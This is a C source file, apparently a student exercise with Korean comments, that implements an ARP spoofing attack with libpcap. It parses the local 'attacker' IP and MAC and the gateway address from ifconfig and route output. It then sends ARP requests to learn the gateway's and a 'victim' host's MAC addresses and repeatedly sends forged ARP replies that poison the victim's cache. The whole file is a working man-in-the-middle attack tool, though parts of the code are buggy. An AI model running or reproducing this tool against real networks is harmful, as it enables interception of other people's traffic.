#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<pcap.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>


int sendarp_req(pcap_t *descr, unsigned char* req_target_ip, unsigned char* req_source_ip,  unsigned char* req_target_mac,  unsigned char* req_source_mac) 
 { 
     struct ether_header header; 
     header.ether_type=htons(ETH_P_ARP); 
 
 
     struct ether_arp req; 
     req.arp_hrd=htons(ARPHRD_ETHER); 
     req.arp_pro=htons(ETH_P_IP); 
     req.arp_hln=ETHER_ADDR_LEN; 
     req.arp_pln=sizeof(in_addr_t); 
     req.arp_op=htons(ARPOP_REQUEST); 
 
 
     struct in_addr target_ip_addr={0}; 
     if (!inet_aton(req_target_ip,&target_ip_addr)) { 
        printf("not valid IP address\n"); 
        return 0;
     } 
     memcpy(&req.arp_tpa,&target_ip_addr.s_addr,sizeof(req.arp_tpa)); 
     struct in_addr source_ip_addr={0}; 
     if (!inet_aton(req_source_ip,&source_ip_addr)) { 
        printf("not valid IP address\n");
        return 0;
     } 
 
 
     memcpy(&req.arp_spa,&source_ip_addr.s_addr,sizeof(req.arp_spa)); 
     memcpy(header.ether_dhost,req_target_mac,sizeof(header.ether_dhost)); 
     memcpy(header.ether_shost,req_source_mac,sizeof(header.ether_shost)); 
     memcpy(&req.arp_sha,req_source_mac,sizeof(req.arp_sha)); 
     memcpy(&req.arp_tha,req_target_mac,sizeof(req.arp_tha)); 
	//메모리에 패킷과 관련된 정보를 저장하여 패킷 생성을 하는 과정입니다 
 
     unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)]; 
     memcpy(frame,&header,sizeof(struct ether_header)); 
     memcpy(frame+sizeof(struct ether_header),&req,sizeof(struct ether_arp)); 
 
 
     if (pcap_inject(descr,frame,sizeof(frame))==-1) { 
         pcap_perror(descr,0); 
         pcap_close(descr); 
         exit(1); 
     } 
 } 

int sendarp_rep(pcap_t *descr, unsigned char* rep_target_ip, unsigned char* rep_source_ip,  unsigned char* rep_target_mac,  unsigned char* rep_source_mac) 
 { 

     struct ether_header header; 
     header.ether_type=htons(ETH_P_ARP); 
      
     struct ether_arp rep; 
     rep.arp_hrd=htons(ARPHRD_ETHER); 
     rep.arp_pro=htons(ETH_P_IP); 
     rep.arp_hln=ETHER_ADDR_LEN; 
     rep.arp_pln=sizeof(in_addr_t); 
     rep.arp_op=htons(ARPOP_REPLY); 
 
 
     struct in_addr target_ip_addr={0}; 
     if (!inet_aton(rep_target_ip,&target_ip_addr)) { 
       printf("ip error\n"); 
       return 0;
     } 
     memcpy(&rep.arp_tpa,&target_ip_addr.s_addr,sizeof(rep.arp_tpa)); 
     struct in_addr source_ip_addr={0}; 
     if (!inet_aton(rep_source_ip,&source_ip_addr)) { 
       printf("invalid ip address\n"); 
       return 0;
     } 
 
 
     memcpy(&rep.arp_spa,&source_ip_addr.s_addr,sizeof(rep.arp_spa)); 
     memcpy(header.ether_dhost,rep_target_mac,sizeof(header.ether_dhost)); 
     memcpy(header.ether_shost,rep_source_mac,sizeof(header.ether_shost)); 
     memcpy(&rep.arp_sha,rep_source_mac,sizeof(rep.arp_sha)); 
     memcpy(&rep.arp_tha,rep_target_mac,sizeof(rep.arp_tha)); 
 	
 
     unsigned char frame[sizeof(struct ether_header)+sizeof(struct ether_arp)]; 
     memcpy(frame,&header,sizeof(struct ether_header)); 
     memcpy(frame+sizeof(struct ether_header),&rep,sizeof(struct ether_arp)); 

 
     if (pcap_inject(descr,frame,sizeof(frame))==-1) { 
         pcap_perror(descr,0); 
       pcap_close(descr); 
         return 0;
     } 
} 


typedef struct arp_header {  
     u_int16_t htype;    /* Hardware Type           */  
     u_int16_t ptype;    /* Protocol Type           */  
     u_char hlen;        /* Hardware Address Length */  
     u_char plen;        /* Protocol Address Length */  
     u_int16_t oper;     /* Operation Code          */  
     u_char sha[6];      /* Sender hardware address */  
     u_char spa[4];      /* Sender IP address       */  
     u_char tha[6];      /* Target hardware address */  
     u_char tpa[4];      /* Target IP address       */  
 }arp_t; 



void ip_len(char* string, unsigned char* ip) 
{ 
 	int len;
	/*
	for(int i = 1 ; i < 4 ; i++)
		 strcat(ip[0],ip[i]);
	ip[0] = atoi(ip[0]);
	*/
  	len = sprintf(string, "%d",ip[0]); 
  	len += sprintf(len + string, ".%d", ip[1]); 
  	len += sprintf(len + string, ".%d", ip[2]); 
  	len += sprintf(len + string, ".%d", ip[3]); 
} 
//ip_len은 ip를 제작하기 위한 부분 입니다



int main(int argc, char * argv[]){

        FILE * fp;
        char buf[512];
        char my_ip[2][512];
        int i =0;
        char gate[2][512];
        char victim[2][512];
        char *device;
        char error[1024];




         if(argc<2){
                printf("enter target ip please!\n");
                return 0;
        }
        // 사용 형식을 지키기 위해서 인자가 2개 미만이면 강제 종료 시킵니다


        memset(my_ip,0,sizeof(my_ip));
        //ip를 파싱 해올 공간을 만듭니다

        system("ifconfig > aaa.txt");
        //후에 제공해주신 헤더 파일에 쉽게 파싱할 방법이 있다고 들었습니다      
        //이 부분을 제작할 당시에는 그 사실을 몰라 ifconfig에서 값을 파싱했습니다

        fp = fopen("aaa.txt","r");
        //c언어는 system함수의 반환값으로 정수를 반환하기 때문에 명령어 결과를
        //aaa.txt텍스트 파일에 저장한뒤 그곳에서 값을 파싱해 왔습니다

        while(!feof(fp)){
         //텍스트 파일을 개행문자를 주기로 한줄식 파싱합니다
                fgets(buf,512,fp);
       if(strstr(buf,"HWaddr") != 0){
                //맥 주소는 HWaddr로 시작하기 때문에 여기서 시작
                        strncpy(my_ip[1],strstr(buf,"00:"),17);
                        //맥주소와 ip값을 파싱 해야 하나 문자열에서 정수를 찾아                         
                        //어디까지를 파싱해야하는지에 대한 부분을 정확하게는 구>현 하지 못해서 일단은 갯수로 받아 왔습니다      
                        //이 부분도 조금 더 생각 해보겠습니다
                        printf("attacker_HW : %s\n",my_ip[1]);
                        i++;
                }

                if(strstr(buf,"inet addr") != 0){
                //ip역시 맥 주소와 같은 방식으로 파싱을 시작 했습니다.
                        strncpy(my_ip[0],strstr(buf,"192"),11);
                        printf("attacker_ip : %s\n",my_ip[0]);
                        i++;
                }

         if(i == 2){
                //ip와 맥 주소를 정상적으로 파싱했을 경우 더이상 파일을 읽지 않>습니다
                        i=0;
                        break;
                }
        }

        system("route > aaa.txt");
        //라우터에 대한 결과 역시 같은 텍스트 파일에 저장하여 그 결과를 가져오고
// 있습니다.

        fp = fopen("aaa.txt","r");

        while(!feof(fp)){


                fgets(buf,512,fp);

                if(strstr(buf,"192") != 0){

        strncpy(gate[0],strstr(buf,"192"),14);
                        printf("gateway_ip : %s\n",gate[0]);
                        i++;
                }

                if(i != 0)
                        break;
        }

         system("rm aaa.txt");
	//mac주소 역시 같은 방법으로 파싱

 	device = pcap_lookupdevice(error); 
 	//패킷을 보내기 전 사전 준비 를 시작합니다
  	bpf_u_int32 net_addr=0, mask=0;  
  	struct bpf_program filter;   
  	pcap_t *descr = NULL;    
  	struct pcap_pkthdr pkthdr;  
  	const unsigned char *packet=NULL; 
  	arp_t *arp_header = NULL; 
 
 
 	if ((descr = pcap_open_live(device, 1024, 0,  512, error))==NULL) 
  	{ 
     		printf("pcap_open_live error!\n");

	} 
      
  	if( pcap_lookupnet( device , &net_addr, &mask, error) == -1) 
  	{ 
     		printf("pcap_lookupnet error!\n");
     		return 0; 
  	} 
 
 
 	if ( pcap_compile(descr, &filter, "arp", 1, mask) == -1) 
 	{ 
     		printf("pcap_compile error!\n");
     		return 0;
  	} 
 
 
  	if (pcap_setfilter(descr,&filter) == -1) 
  	{ 
     		printf("pcap_setfilter error!\n");
     		return 0; 
  	} 
	

	unsigned char non_mac[6]; 
	
	for( i = 0;i<6;i++){

  		non_mac[i] = 0xff; 
  	
	} 
	//아직은 mac주소를 모르기 때문에 맥주소는 ff로 모두 초기화 해 둡니다

  	unsigned char* test = (unsigned char*) non_mac; 
 
	 
      
 
 
  	sendarp_req(descr, (unsigned char*)gate[0],(unsigned char *)my_ip[0], test,(unsigned char *)my_ip[1]); 
  	sendarp_req(descr, (unsigned char*) argv[1],(unsigned char *)my_ip[0], test,(unsigned char *)my_ip[1]); 
 //gate와 victim에게 각각 request를 합니다.
 
          char gateway_get[1024]; 
          char victim_get[1024]; 
          unsigned char gateway_mac[6]; 
          unsigned char victim_mac[6]; 
 
 
          int  Gateway = 0;
	  int  Victim = 0; 
 
 
          int turn = 0; 
 
 	 
  	while(1) 
  	{

		if(!strcmp(gateway_get,gate[0]) && Gateway == 0)
                {
                        printf("gateway mac data.....\n");
                        for(i=0;i<6;i++){
                                gateway_mac[i] = arp_header->sha[i];
                         }
                         Gateway++;
                }
		

                if(!strcmp(argv[1],victim_get) && Victim == 0)
                {
                        printf("victim mac data.....\n");
                        for(i=0;i<6;i++){
                        victim_mac[i] = arp_header->sha[i];
                        }
                         Victim++;
                }

  		
 
  		if( Victim && Gateway && !turn) 
  		{ 
			sendarp_rep(descr, (unsigned char*)argv[1], (unsigned char*)gate[0], test, (unsigned char*)my_ip[1]);
  			printf("Sending Wait for a second.....\n"); 
			
  		} 

 		if(turn)
  			turn = 0; 
 		else 
  			turn = 1; 
 
 
   		if ( (packet = pcap_next(descr,&pkthdr)) == NULL) 
  		{ 
     			printf("catching packet is fail\n");
     			continue; 
  		} 
 		// 이 부분은 패킷을 캡쳐하는 부분입니다 패킷이 없다면 request를 실패했다고 생각하여 continue문을 사용하여 다시 response를 받기위해 쏩니다
 
  		arp_header = (struct arp_header *)(packet+14); 
 		
 

   		if( Gateway) 
  			ip_len(victim_get, arp_header->spa); 
  		ip_len(gateway_get, arp_header->spa);
		 //ip를 조립 합니다
 
 
  		printf("%s\n",gateway_get); 
		//패킷을 출력
	
	}




}


